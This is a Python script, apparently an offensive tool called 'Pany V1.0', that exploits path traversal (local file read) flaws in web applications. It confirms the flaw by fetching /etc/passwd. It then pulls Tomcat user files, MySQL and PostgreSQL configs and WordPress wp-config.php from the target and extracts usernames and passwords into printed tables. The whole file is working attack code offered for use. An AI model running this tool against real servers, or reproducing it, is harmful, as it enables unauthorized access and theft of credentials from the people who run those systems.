#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝

import requests
import re
import argparse
from urllib.parse import urlparse, urlunparse, urljoin
from tabulate import tabulate

RESET = "\033[0m"
GREEN = "\033[92m"
RED = "\033[91m"
ORANGE = "\033[38;5;208m"
DEFAULT = "\033[0m"

def format_color(value, color):
    return f"{color}{value}{RESET}"

def process_passwd_data(data):
    users = []
    sensitive_users = []
    for line in data.splitlines():
        parts = line.split(":")
        if len(parts) < 7:
            continue
        raw_username = parts[0]
        username = format_color(raw_username, ORANGE)
        uid = parts[2]
        gid = parts[3]
        home_dir = parts[5]
        shell = parts[6]

        user_info = {
            "User": username,
            "UID": uid,
            "GID": gid,
            "Home": home_dir,
            "Shell": shell
        }

        users.append({
            "User": raw_username,
            "UID": uid,
            "GID": gid,
            "Home": home_dir,
            "Shell": shell
        })

        if uid == "0" or "nologin" in shell or "false" in shell:
            sensitive_users.append(user_info)

    return users, sensitive_users

def process_tomcat_users_data(data):
    users = re.findall(r'<user\s+username="([^"]+)"\s+password="([^"]+)"', data)
    return [
        {
            "User": format_color(user[0], ORANGE),
            "Password": format_color(user[1], RED)
        }
        for user in users
    ]

def process_mysql_config(data):
    user = re.search(r'user\s*=\s*(\S+)', data)
    password = re.search(r'password\s*=\s*(\S+)', data)
    return {
        "User": format_color(user.group(1), ORANGE) if user else "Not Found",
        "Password": format_color(password.group(1), RED) if password else "Not Found"
    }

def process_postgresql_config(data):
    user = re.search(r'user\s*=\s*(\S+)', data)
    password = re.search(r'password\s*=\s*(\S+)', data)
    return {
        "User": format_color(user.group(1), ORANGE) if user else "Not Found",
        "Password": format_color(password.group(1), RED) if password else "Not Found"
    }

def process_wordpress_config(data):
    db_name = re.search(r'define\s*\(\s*\'DB_NAME\'\s*,\s*\'(\S+)\'', data)
    db_user = re.search(r'define\s*\(\s*\'DB_USER\'\s*,\s*\'(\S+)\'', data)
    db_password = re.search(r'define\s*\(\s*\'DB_PASSWORD\'\s*,\s*\'(\S+)\'', data)
    return {
        "DB Name": format_color(db_name.group(1), ORANGE) if db_name else "Not Found",
        "DB User": format_color(db_user.group(1), ORANGE) if db_user else "Not Found",
        "DB Password": format_color(db_password.group(1), RED) if db_password else "Not Found"
    }

def fetch_page(url, cookie=None):
    try:
        headers = {}
        if cookie:
            headers['Cookie'] = cookie
        response = requests.get(url, headers=headers, verify=False)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        print(f"{RED}[-] Failed to fetch page: {e}{RESET}")
        return None

def detect_file_read_vulnerability(base_url, cookie=None):
    test_url = base_url.replace('*','../../../../../../../../../etc/passwd')
    print(f"{GREEN}[*] Testing file read vulnerability at {test_url}{RESET}")
    response = fetch_page(test_url, cookie)
    if response and 'root' in response:
        print(f"{GREEN}[+] File read vulnerability detected.{RESET}")
        return True
    print(f"{RED}[-] File read vulnerability not detected.{RESET}")
    return False

def read_files(base_url, output_file, cookie=None):
    sensitive_files = {
        "/etc/passwd": process_passwd_data,
        "/opt/tomcat/conf/tomcat-users.xml": process_tomcat_users_data,
        "/usr/share/tomcat9/etc/tomcat-users.xml": process_tomcat_users_data,
        "/etc/mysql/my.cnf": process_mysql_config,
        "/etc/postgresql/9.3/main/postgresql.conf": process_postgresql_config,
        "/etc/postgresql/12/main/postgresql.conf": process_postgresql_config,
        "/var/www/html/wp-config.php": process_wordpress_config,
    }

    prefix = '../../../../../../../../../'

    all_users = []

    for file_path, process_func in sensitive_files.items():
        prefixed_path = prefix + file_path
        url = base_url.replace('*', prefixed_path)
        print(f"{GREEN}[*] Trying to read {file_path}{RESET}")
        page_content = fetch_page(url, cookie)

        if page_content:
            try:
                result = process_func(page_content)
                if isinstance(result, tuple):
                    users, sensitive_users = result
                    print(f"{GREEN}[+] Sensitive file successfully retrieved: {file_path}{RESET}")

                    if sensitive_users:
                        print(tabulate(sensitive_users, headers="keys", tablefmt="grid"))
                        all_users.extend([user["User"] for user in users])
                    else:
                        print(f"{RED}No sensitive users found.{RESET}")
                    print(f"{'-'*60}{RESET}")
                elif isinstance(result, list):
                    print(f"{GREEN}[+] Sensitive file successfully retrieved: {file_path}{RESET}")
                    print(tabulate(result, headers="keys", tablefmt="grid"))
                    print(f"{'-'*60}{RESET}")
                elif isinstance(result, dict):
                    print(f"{GREEN}[+] Sensitive file successfully retrieved: {file_path}{RESET}")
                    table = [[k, v] for k, v in result.items()]
                    print(tabulate(table, headers=["Key", "Value"], tablefmt="grid"))
                    print(f"{'-'*60}{RESET}")
                else:
                    print(f"{RED}Unexpected data format for {file_path}{RESET}")
            except Exception as e:
                print(f"{RED}[-] Failed to process content for {file_path}: {e}{RESET}")
        else:
            print(f"{RED}[-] Failed to retrieve {file_path} from {url}{RESET}")

    if output_file:
        with open(output_file, "w") as file:
            for user in all_users:
                file.write(f"{user}\n")
        print(f"{GREEN}[+] Usernames exported to {output_file}{RESET}")

def print_logo():
    logo = """
 /$$$$$$$
| $$__  $$
| $$  \ $$ /$$$$$$  /$$$$$$$  /$$   /$$
| $$$$$$$/|____  $$| $$__  $$| $$  | $$
| $$____/  /$$$$$$$| $$  \ $$| $$  | $$
| $$      /$$__  $$| $$  | $$| $$  | $$
| $$     |  $$$$$$$| $$  | $$|  $$$$$$$
|__/      \_______/|__/  |__/ \____  $$
                              /$$  | $$
                             |  $$$$$$/
                              \______/
        Github==>https://github.com/MartinxMax
        @Мартин. Pany V1.0
    """
    print(f"{GREEN}{logo}{RESET}")

if __name__ == "__main__":
    print_logo()
    parser = argparse.ArgumentParser(description="Fetch and process sensitive files from a URL.")
    parser.add_argument('-u', '--url', required=True, help='Base URL with optional scheme (http/https)')
    parser.add_argument('-o', '--output', help='File to save the usernames')
    parser.add_argument('--cookie', help='Cookie string to be used for the HTTP request')
    args = parser.parse_args()
 
    if detect_file_read_vulnerability(args.url, args.cookie):
        read_files(args.url, args.output, args.cookie)
